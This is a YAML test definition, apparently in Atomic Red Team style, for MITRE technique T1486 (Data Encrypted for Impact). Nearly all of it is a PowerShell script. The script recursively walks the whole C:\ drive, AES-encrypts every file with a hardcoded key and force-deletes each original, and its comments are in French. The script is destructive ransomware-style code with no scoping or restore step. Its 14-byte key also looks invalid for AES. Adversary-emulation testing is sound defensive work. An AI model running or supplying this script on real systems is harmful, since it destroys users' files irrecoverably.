attack_technique: T1486
display_name: Data Encrypted for Impact
atomic_tests:
- name: Encrypt Files on C Drive
  description: Simulates a ransomware attack by encrypting files on C:\ and deleting originals.
  supported_platforms:
    - windows
  executor:
    name: powershell
    command: |
      $targetDirectory = "C:\\"
      $key = "MySecretKey123" # Clé de chiffrement (peut être modifiée)

      function Encrypt-File {
          param (
              [string]$filePath,
              [string]$key
          )
          try {
              # Lire le contenu du fichier
              $fileContent = Get-Content -Path $filePath -Raw -Encoding Byte

              # Configurer l'algorithme de chiffrement AES
              $aes = New-Object System.Security.Cryptography.AesManaged
              $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
              $aes.IV = New-Object Byte[]($aes.BlockSize / 8) # IV vide pour simplicité
              $encryptor = $aes.CreateEncryptor()

              # Chiffrer les données
              $encryptedData = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)

              # Écrire les données chiffrées dans un nouveau fichier
              Set-Content -Path ($filePath + ".encrypted") -Value $encryptedData -Encoding Byte

              # Supprimer le fichier original
              Remove-Item -Path $filePath -Force
              Write-Host "Fichier chiffré et supprimé : $filePath"
          } catch {
              Write-Host "Erreur lors du chiffrement de $filePath : $_"
          }
      }

      # Parcourir tous les fichiers dans le répertoire cible
      Get-ChildItem -Path $targetDirectory -Recurse -File | ForEach-Object {
          Encrypt-File -filePath $_.FullName -key $key
      }
